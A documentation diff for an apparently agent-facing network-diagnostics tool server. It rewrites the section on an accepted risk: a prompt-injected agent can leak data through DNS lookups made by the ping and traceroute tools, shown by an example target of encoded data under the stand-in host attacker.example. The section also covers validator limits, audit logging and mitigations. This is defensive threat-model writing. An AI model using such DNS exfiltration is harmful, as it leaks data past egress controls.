@@ -248,14 +248,23 @@ If a privileged tool is enabled but the matching capability is missing, the
 underlying command fails at execution time — the result envelope
 carries `status: "fail"` rather than the protocol returning an error.
 
-**Accepted risk — DNS lookups from `ping` / `traceroute`.** Both accept a
-hostname `target` and resolve it (`-n` only suppresses reverse lookups).
-A prompt-injected agent with these tools enabled can therefore leak data
-through the DNS query itself, e.g. `{"target": "<encoded-data>.attacker.example"}`,
-even where ICMP to the internet is blocked. The ungated `net.route_get`
-does not resolve names. If this matters for a deployment, leave `ping` and
-`traceroute` out of `NETDIAG_ENABLE_PRIVILEGED`, or restrict the host's
-outbound DNS.
+### Accepted risk: DNS resolution of `target`
+
+`net.ping` and `net.traceroute` accept a hostname `target` and resolve it
+(`-n` only suppresses reverse lookups). A prompt-injected agent with these
+tools enabled can therefore leak data through the DNS query itself, e.g.
+`{"target": "<encoded-data>.attacker.example"}`, even where the probes
+themselves (ICMP echo / UDP) are blocked at egress. Each call carries at
+most 128 characters of `[A-Za-z0-9.:_/-]` (the `target` validator), and
+the audit journal's `call` row records the argument verbatim, so such
+lookups are visible after the fact.
+
+The default tool `net.route_get` is not affected: `ip route get` rejects
+anything that is not an address or prefix, so a hostname `target` comes
+back as `status: "fail"` without any lookup.
+
+If this matters for a deployment, leave `ping` and `traceroute` out of
+`NETDIAG_ENABLE_PRIVILEGED`, or restrict the host's outbound DNS.
 
 ### Audit trail
 
